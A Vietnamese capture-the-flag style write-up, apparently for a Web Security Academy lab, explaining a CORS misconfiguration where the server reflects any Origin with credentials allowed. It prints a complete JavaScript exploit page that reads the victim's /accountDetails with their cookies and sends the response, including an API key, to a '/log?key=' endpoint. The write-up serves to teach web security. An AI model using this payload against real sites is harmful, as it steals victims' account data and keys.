![image](https://github.com/user-attachments/assets/01122618-4761-4948-b4eb-03e1d88f0c76)

Khi đăng nhập với wiener thì có api key:

![image](https://github.com/user-attachments/assets/3aad1be9-61fa-4919-aa91-956b4651ed0b)

![image](https://github.com/user-attachments/assets/89c50661-9216-4912-b249-703f8cd4a949)

Ở response có Access-Control-Allow-Credentials: true là một header trong CORS (Cross-Origin Resource Sharing) cho phép trình duyệt gửi và nhận cookies hoặc các thông tin xác thực (như HTTP authentication, client-side SSL certificates) giữa các domain khác nhau. Access-Control-Allow-Origin: là một HTTP response header trong CORS (Cross-Origin Resource Sharing), cho phép trình duyệt chấp nhận yêu cầu từ origin

![image](https://github.com/user-attachments/assets/0ad921e2-8b41-458b-829f-615509e9b8b7)

Tôi thêm cái Origin: https://google.com vào và nó vẫn chấp nhận, điều đó chứng tỏ chấp nhận mọi tên miền 

![image](https://github.com/user-attachments/assets/0a5ee79c-0a23-4faf-91ce-3be41f8dae30)

```
<html>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://0aaa0023041694e88161213900b60092.web-security-academy.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```

Tạo một đối tượng XMLHttpRequest để thực hiện một request HTTP. Khai báo biến url chứa domain mục tiêu, là trang web nạn nhân. Khi request hoàn tất (xhr.readyState == XMLHttpRequest.DONE), nội dung phản hồi từ server (xhr.responseText) sẽ được gửi đến /log?key=. Gửi một yêu cầu GET đến trang mục tiêu (/accountDetails) để lấy dữ liệu tài khoản của nạn nhân. true có nghĩa là request được thực hiện bất đồng bộ
 Gửi kèm cookies của nạn nhân.

<h1>---------------------------------------------------------</h1>
<br>





